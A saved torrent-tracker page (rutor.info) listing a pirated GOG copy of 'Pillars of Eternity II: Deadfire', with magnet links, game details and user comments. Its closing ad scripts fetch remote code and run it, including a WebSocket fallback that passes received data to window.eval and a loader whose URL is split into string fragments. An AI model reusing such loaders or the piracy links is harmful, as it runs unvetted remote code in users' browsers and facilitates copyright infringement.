@@ -1,0 +1,365 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Pillars of Eternity II: Deadfire (2018) PC | Лицензия</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Pillars of Eternity II: Deadfire (2018) PC | Лицензия</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:869981c78597027bd377877e43c24b7a84ea6283&amp;dn=rutor.info_Pillars+of+Eternity+II%3A+Deadfire+%282018%29+PC+%7C+%D0%9B%D0%B8%D1%86%D0%B5%D0%BD%D0%B7%D0%B8%D1%8F&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630538"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630538"><img src="http://s.rutor.info/t/down.png"> Скачать pillars_of_eternity_2_gog.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><span style="color:#293133;"><span style="font-family:georgia;"><center><img src="http://i3.imageban.ru/out/2018/05/08/3a9de9041cbc6cfbe733e12957963621.png" /></center><br />
+<br />
+<br />
+<img src="http://i3.imageban.ru/out/2018/05/08/9a93e77e6514b7db196ce15da1670589.png" style="float:right;" /><b>Дата выпуска</b>: 8 мая 2018<br />
+<b>Жанр</b>:  <a href="/tag/8/RPG" target="_blank">RPG</a>, <a href="/tag/8/Isometric" target="_blank">Isometric</a>, <a href="/tag/8/3D" target="_blank">3D</a><br />
+<b>Разработчик</b>: Obsidian Entertainment<br />
+<b>Издатель</b>: Versus Evil, Obsidian Entertainment<br />
+<b>Тип издания</b>: Лицензия {GOG}<br />
+<b>Язык интерфейса</b>: Русский, английский, MULTi<br />
+<b>Язык озвучки</b>: Английский<br />
+<b>Лекарство</b>: Не требуется {DRM-Free}<br />
+<br />
+<b>Системные требования</b>:<br />
+<li><b>ОС</b>: Windows Vista/7/8/10 (только версии 64-бит)<br />
+<li><b>Процессор</b>: Intel Core i3-2100T @ 2.50 GHz / AMD Phenom II X3 B73<br />
+<li><b>Оперативная память</b>: 4 GB ОЗУ<br />
+<li><b>Видеокарта</b>: DirectX 11 Compatible<br />
+<li><b>Место на диске</b>: 45 GB<br />
+<li><b>Звуковая карта</b>: DirectX Compatible Sound Card<br />
+<br />
+<b>Описание</b>: Pillars of Eternity II: Deadfire – это сиквел к Pillars of Eternity, которая вышла в 2015 году заслужив расположение игроков на РС (а позже и консольных геймеров), а также высочайшие оценки критиков. Игра Pillars of Eternity II: Deadfire была выставлена разработками Obsidian Entertainment на краудфандинговую платформу Fig (аналог Kickstarter) и собрала в 4 раза больше, чем изначально планировалось – 4,7 миллионов долларов.<br />
+<br />
+Сиквел будет включать полюбившихся героев из оригинальной Pillars of Eternity, перед которыми, однако, ставятся новые задачи - победить таинственно ожившего бога Эотаса, руины храма которого исследовались в первой части. Преследуйте беглого бога на земле и по морю. Отправьте свой корабль в опасную экспедицию через огромный неизученный архипелаг Дэдфайр. Подчините мир своей воле – исследуйте массу безграничных возможностей, включая детальную персонализацию героя, полную свободу в исследовании мира и продуманные варианты выбора, встречающиеся на каждом шагу.<br />
+<br />
+<b>Особенности игры</b>:<br />
+<li>Погрузитесь в углубленную механику однопользовательских ролевых игр – подкрепленная передовыми технологиями и возможностями, игра Deadfire построена на базе классической системы D&amp;D и отличается значительно улучшенной графикой, углубленной игровой механикой и новым самостоятельно созданным приключением, где принятые решения действительно имеют значение.<br />
+<li>Откройте новый регион – Дэдфайр – проложите собственный курс корабля и исследуйте богатые экзотические острова архипелага, открывая новые места, взаимодействуя с местными жителями и выполняя различные задания в каждом порту.<br />
+<li>Создайте группу и настройте спутников – к вашему приключению могут присоединиться до 7 различных спутников, при этом каждый из них может развиваться в нескольких классах и использовать улучшенные способности. Наблюдайте за их взаимодействием и развитием отношений благодаря новой системе спутников.<br />
+<li>Станьте капитаном, чтобы повести по морям свой корабль, подобный плавучей крепости – это вам не просто исследовательское судно! Совершенствуйте свой корабль и команду, а также выбирайте навыки для улучшения, чтобы выжить в опасных схватках, поджидающих на пути.<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Установка</div><div class="hidebody"></div><textarea class="hidearea"><ol><li>Установить игру, следуя инструкциям программы установки;<br />
+<li>Установить DLC из предзаказа;<br />
+<li>Играть.</li></li></li></ol></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><center><a href="http://lostpic.net/image/cRip" target="_blank"><img src="http://img12.lostpic.net/2018/05/08/06db35eced384abe7beffc9bcd6f4855.th.jpg" /></a> <a href="http://lostpic.net/image/cRiB" target="_blank"><img src="http://img12.lostpic.net/2018/05/08/1923f230afb0e60343b5300e18090b6a.th.jpg" /></a> <a href="http://lostpic.net/image/cRia" target="_blank"><img src="http://img12.lostpic.net/2018/05/08/55eb9feffa75eae7cc6cbea9a644d79f.th.jpg" /></a> <a href="http://lostpic.net/image/cRii" target="_blank"><img src="http://img12.lostpic.net/2018/05/08/5d6944b091e1617c2cb526d18f1c4be2.th.jpg" /></a><br />
+<a href="http://lostpic.net/image/cRiz" target="_blank"><img src="http://img12.lostpic.net/2018/05/08/9eb268025c71de2758026c5d7d8f4064.th.jpg" /></a> <a href="http://lostpic.net/image/cRi3" target="_blank"><img src="http://img12.lostpic.net/2018/05/08/e790508932e1f7e512c989d252fd3a25.th.jpg" /></a> <a href="http://lostpic.net/image/cRif" target="_blank"><img src="http://img12.lostpic.net/2018/05/08/be12608405066df2f29375d7f8c076ed.th.jpg" /></a> <a href="http://lostpic.net/image/cRio" target="_blank"><img src="http://img12.lostpic.net/2018/05/08/0452025e2b58b675ec898333b587b375.th.jpg" /></a></center></textarea></div></span></span></li></li></li></li></li></li></li></li></li></li></td></tr>
+
+<tr><td class="header">Оценка</td><td>8 из 10 (5 голосов, самая низкая оценка - 1, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/games" target="_blank">Игры </a></td></tr>
+<tr><td class="header">Раздают</td><td>365</td></tr>
+<tr><td class="header">Качают</td><td>207</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (17 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 20:20:15  (12 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>20.09&nbsp;GB  (21573947335 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630538);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>09&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/630580"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f01bbca1e2a1960d93204bbb94ec49abe95813ea&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630580/pillars-of-eternity-ii-deadfire-2018-pc-repack-ot-xatab">Pillars of Eternity II: Deadfire (2018) PC | RePack от xatab </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">13.23&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;269</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;311</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/630545"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d909706c37d9f958183cd218732e79e1386a3a61&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630545/pillars-of-eternity-ii-deadfire-2018-pc-repack-ot-qoob">Pillars of Eternity II: Deadfire (2018) PC | RePack от qoob </a></td> <td align="right">5<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">13.39&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;231</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;157</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/8/0/0/Pillars of Eternity II" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630538.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (8)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630538">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630538);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630538);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630538">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>Alez123321</b></td> <td>09-05-2018 8:04:17 (32 минуты назад)</td> <td></td> <td align="right"><span id="c_3199701"></span><script type="text/javascript">cOptions(1542884,3199701);</script></td></tr><tr><td class="c_t" colspan=4><b>Комментарий проверяется! Он будет виден как только кто-то из персонала его утвердит!</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ReadYourself</b></td> <td>09-05-2018 3:55:12 (5 часов назад)</td> <td></td> <td align="right"><span id="c_3199663"></span><script type="text/javascript">cOptions(1468709,3199663);</script></td></tr><tr><td class="c_t" colspan=4><b>e2li</b> Кто не сжал, разработчики должны были сжать? Это же лицензия, кто её тут будет сжимать ? А радуются этому, потому что Icewind Dale не выходит, а это выходит. Вышел бы Ice, радовались бы ему.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>e2li</b></td> <td>09-05-2018 3:28:48 (5 часов назад)</td> <td>Оценил на: <b>1</b></td> <td align="right"><span id="c_3199662"></span><script type="text/javascript">cOptions(69121,3199662);</script></td></tr><tr><td class="c_t" colspan=4>Как и первая часть, это банальный реворк Icewind Dale. Чему там все радуются я хз.<br />
+Да и вес игрушки просто запредельный. Там нечему столько весить. Банально даже не сжали.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ice_one1</b></td> <td>09-05-2018 3:12:48 (5 часов назад)</td> <td></td> <td align="right"><span id="c_3199657"></span><script type="text/javascript">cOptions(252660,3199657);</script></td></tr><tr><td class="c_t" colspan=4>Да простят все, но я упорно не понимаю зачем этой игре 45 гигов места на диске. Что они в неё засунули?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Турик11</b></td> <td>09-05-2018 0:14:55 (8 часов назад)</td> <td></td> <td align="right"><span id="c_3199628"></span><script type="text/javascript">cOptions(1390420,3199628);</script></td></tr><tr><td class="c_t" colspan=4>Более чем уверен, что будут патчи, в том числе балансные. На днях смотрел видео по игре, вроде свежее, так там чел на максимальной сложности в 5 монахов всё разрывал...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sutocem</b></td> <td>08-05-2018 23:14:39 (9 часов назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199606"></span><script type="text/javascript">cOptions(1485341,3199606);</script></td></tr><tr><td class="c_t" colspan=4>Ухты! Какая неожиданность! Я то думал что это DLC к первой части, даже пытался найти вечного дракона в конце многоуровнего подземелья. Но по скринам ничего из старого.<br />
+Теперь нужно выделить время на прохождение.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>scullcrasher</b></td> <td>08-05-2018 22:52:26 (10 часов назад)</td> <td></td> <td align="right"><span id="c_3199597"></span><script type="text/javascript">cOptions(126000,3199597);</script></td></tr><tr><td class="c_t" colspan=4>Забавно, сабж устанавливается дольше, чем качался. Гораздо дольше...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Woodworker</b></td> <td>08-05-2018 21:41:30 (11 час назад)</td> <td></td> <td align="right"><span id="c_3199572"></span><script type="text/javascript">cOptions(956708,3199572);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />ах ладно уговорили уже скачиваю.</fieldset><br />
+И кто же в уговорах так постарался?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>DoctorKto</b></td> <td>08-05-2018 21:08:21 (11 час назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199559"></span><script type="text/javascript">cOptions(1491259,3199559);</script></td></tr><tr><td class="c_t" colspan=4>Подождать RePack от xatab или скачать, ах ладно уговорили уже скачиваю.  </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>paradox30999</b></td> <td>08-05-2018 21:05:14 (12 часа назад)</td> <td></td> <td align="right"><span id="c_3199557"></span><script type="text/javascript">cOptions(1499152,3199557);</script></td></tr><tr><td class="c_t" colspan=4>У игры бетка была, так что по поводу патчей можно не беспокоиться.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Pancer1</b></td> <td>08-05-2018 20:54:56 (12 часа назад)</td> <td></td> <td align="right"><span id="c_3199550"></span><script type="text/javascript">cOptions(414833,3199550);</script></td></tr><tr><td class="c_t" colspan=4>Очень хочется начать играть, но немного подожду, поскольку по опыту знаю что играть без багов и прочего болота, можно начинать только спустя 4 или 5 патчей.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tiranii</b></td> <td>08-05-2018 20:53:47 (12 часа назад)</td> <td></td> <td align="right"><span id="c_3199549"></span><script type="text/javascript">cOptions(1503486,3199549);</script></td></tr><tr><td class="c_t" colspan=4>ну извиняюсь, раздача<br />
+<br />
+<span style="color:grey;">// Это лицензия от GOG. Рабочая, разумеется. //</span></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ZanozaVpope</b></td> <td>08-05-2018 20:51:41 (12 часа назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199548"></span><script type="text/javascript">cOptions(360234,3199548);</script></td></tr><tr><td class="c_t" colspan=4>Уот так уот уам усем!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>qehe77</b></td> <td>08-05-2018 20:47:19 (12 часа назад)</td> <td></td> <td align="right"><span id="c_3199544"></span><script type="text/javascript">cOptions(1536522,3199544);</script></td></tr><tr><td class="c_t" colspan=4>станте на раздачу!!<br />
+<br />
+<span style="color:grey;">// А проявить терпение? Вы не один скачиваете. //</span></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tiranii</b></td> <td>08-05-2018 20:45:15 (12 часа назад)</td> <td></td> <td align="right"><span id="c_3199541"></span><script type="text/javascript">cOptions(1503486,3199541);</script></td></tr><tr><td class="c_t" colspan=4>Как репак народ, нормально всё?<br />
+<br />
+<span style="color:grey;">// Это не Repack. //</span></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>restet</b></td> <td>08-05-2018 20:41:43 (12 часа назад)</td> <td></td> <td align="right"><span id="c_3199538"></span><script type="text/javascript">cOptions(357205,3199538);</script></td></tr><tr><td class="c_t" colspan=4>отлично. давно ждал.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Oda Nobun@ga</b></td> <td>08-05-2018 20:36:43 (12 часа назад)</td> <td>Оценил на: <b>9</b></td> <td align="right"><span id="c_3199537"></span><script type="text/javascript">cOptions(1535888,3199537);</script></td></tr><tr><td class="c_t" colspan=4>Ура !!!</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
